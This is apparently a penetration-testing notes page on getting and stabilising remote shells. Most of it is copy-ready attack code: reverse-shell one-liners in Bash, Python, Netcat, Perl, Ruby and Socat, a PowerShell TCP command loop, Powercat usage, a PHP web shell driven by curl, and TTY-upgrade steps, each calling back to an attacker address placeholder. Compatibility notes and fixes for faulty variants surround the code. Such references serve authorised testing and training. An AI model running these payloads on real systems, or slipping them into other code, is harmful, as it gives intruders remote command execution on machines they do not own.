# Shell delivery and stabilization

[Home](../README.md) · [Transfers](File-Transfers.md) · [Metasploit](Metasploit.md) · [Command injection](../02-Web/Command-Injection.md)

## Direction and payload compatibility

| Mode | Listener | Connection initiator |
|---|---|---|
| Reverse shell | Attacking machine | Target |
| Bind shell | Target | Attacking machine |
| Web shell | Existing HTTP server | HTTP client makes one request per command |

Set `<LHOST>` to an address reachable **from the target**, including through any pivot. Match OS, architecture, runtime, port and payload protocol. A raw shell and Meterpreter do not use interchangeable listeners.

## Raw TCP listener

**Kali / Bash:**

```bash
rlwrap nc -lvnp 4444
```

`rlwrap` adds local line editing; it does not give the remote shell a TTY.

## Linux target examples

**Bash required:**

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

**Python 3:**

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**Netcat with execution support:**

```bash
nc <LHOST> 4444 -e /bin/sh
```

OpenBSD Netcat commonly lacks `-e`. A FIFO pipeline is an alternative when its components exist:

```bash
mkfifo /tmp/shellpipe
cat /tmp/shellpipe | /bin/sh -i 2>&1 | nc <LHOST> 4444 > /tmp/shellpipe
```

Choose a fresh FIFO name and remove it afterward. For PHP, Java/JSP, Groovy/Jenkins, Lua, Perl or Ruby, use the runtime actually available; runtime strings are not commands to paste into an unrelated shell.

## Windows target examples

**CMD, with a Netcat binary that supports `-e`:**

```batch
nc64.exe <LHOST> 4444 -e cmd.exe
```

**PowerShell, after loading a reviewed local Powercat script:**

```powershell
. .\powercat.ps1
powercat -c <LHOST> -p 4444 -e powershell
```

The following plain PowerShell TCP loop is consolidated from the repeated source examples. It is a basic command channel, not a full terminal:

```powershell
$client = New-Object Net.Sockets.TCPClient('<LHOST>',4444)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65536
while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
    $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count)
    $output = (Invoke-Expression $command 2>&1 | Out-String)
    $reply = [Text.Encoding]::ASCII.GetBytes($output + 'PS ' + (Get-Location).Path + '> ')
    $stream.Write($reply,0,$reply.Length)
    $stream.Flush()
}
$client.Close()
```

When an outer command needs `powershell.exe -EncodedCommand`, encode the script as **UTF-16LE without a BOM**, then Base64. This is transport encoding, not encryption or a guarantee of avoiding detection. Preserve the plain script in the notebook.

## Socat channels

**Kali listener:**

```bash
socat -d -d TCP-LISTEN:4444,reuseaddr FILE:$(tty),raw,echo=0
```

**Linux target:**

```bash
socat TCP:<LHOST>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

For an encrypted channel, Socat can use `OPENSSL-LISTEN` and `OPENSSL` addresses with a certificate/key PEM. Generate a lab certificate with OpenSSL, combine key and certificate, and configure the endpoints. `verify=0` disables peer verification; it should be a deliberate lab choice. A bind listener's command runs on the listening host, regardless of how a source transcript labels it.

## Upgrade a Linux shell

**Inside the remote shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Press **Ctrl-Z** to suspend the local listener. **In local Bash**, record terminal dimensions with `stty size`, then:

```bash
stty raw -echo; fg
```

Press Enter. **In the remote shell:**

```bash
export TERM=xterm-256color
stty rows <ROWS> columns <COLUMNS>
```

Use `TERM`, not the source typo `XTERM`. If Python is unavailable, try `script -q -c /bin/bash /dev/null` where supported. If the local terminal is left unusable, restore it with `stty sane` or `reset` in that terminal.

## Web shells

For a PHP handler:

```php
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

```bash
curl --get 'http://<HOSTNAME>/shell.php' --data-urlencode 'cmd=id'
```

The source JSP example calls Java `Runtime.exec`; it launches a process but does not automatically interpret pipes, redirection or shell built-ins. An explicit OS shell is needed for those features. ASPX requires ASP.NET handling; changing a suffix does not install the runtime. Weevely is an alternative web-shell framework in the supplied tools list.

## Diagnose a failed callback

Prove a simple command first. Check target egress, callback IP, listener binding/port, firewall, runtime, architecture, quoting and staged/stageless compatibility. Start a new channel before closing a working one. A shell that exits immediately may have lost its parent process or inherited unsuitable input/output handles; record the actual exit behavior.

## Additional runtimes and consumers

**Perl on a Unix target:**

```bash
perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i))) or die $!;open(STDIN,"<&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh","-i");'
```

**Ruby on a Unix target:**

```bash
ruby -rsocket -e 's=TCPSocket.new("<LHOST>",4444);STDIN.reopen(s);STDOUT.reopen(s);STDERR.reopen(s);exec("/bin/sh","-i")'
```

**Lua with a Unix shell available:** `lua -e 'os.execute("/bin/sh")'` starts a local child shell. A reverse channel still needs an available socket library or a shell-based network primitive; `os.execute` alone does not connect anywhere.

| Source variant | Actual requirement / correction |
|---|---|
| Groovy / Jenkins script console | Permission to execute scripts, compatible Java runtime and reachable callback. ProcessBuilder launches the OS command; the source loop bridges its streams to a Socket. Groovy list/cast syntax is not plain Java source. |
| Node.js | Server-side `net` and `child_process` modules; browser JavaScript cannot import them merely because an XSS exists. |
| Java/JSP | Executing server-side runtime and process-launch permission; `Runtime.exec` does not automatically interpret shell metacharacters. |
| GNU awk network channel | Implementation supporting `/inet/tcp` plus process/pipe features; generic awk implementations need not support it. |
| Tcl `socket` + command loop | Tcl interpreter, socket/process APIs and correct event/stream handling. |
| PHP `fsockopen` one-liners | Source assumes socket is file descriptor 3, which is unreliable. A process/stream bridge avoids that assumption; check disabled functions and OS support. |
| SCTP or UDP Python variants | Appropriate library/protocol support and a matching listener; a TCP listener cannot receive them. |
| Telnet/FIFO variants | Two-way stream plumbing and available utilities; the source has malformed redirections. Prefer the complete FIFO pattern above when supported. |
| xterm/X11 | Reachable X server and explicit display authorization. `xhost +` broadly changes access; it is not a terminal upgrade over an existing shell. |
| Bukkit plugin | A loaded JavaPlugin's `onEnable` can execute plugin code. Writing a PHP file additionally needs a shared webroot, file permissions and PHP handling. A JAR is not inherently a web shell. |
| Markdown/curl examples | They rely on a vulnerable external processor or an existing injection point. Markdown and curl do not execute remote shell strings by themselves; repair JSON/form quoting at the request layer. |

For restricted environments, see [restricted shells](../04-Linux/Exploitation-Patterns.md#restricted-shells). `--noprofile`/`--norc` can skip Bash startup files if an alternate invocation is allowed; server-side forced commands and actual authorization remain in effect. Preserve startup files instead of deleting `.bashrc` as a routine escape attempt.
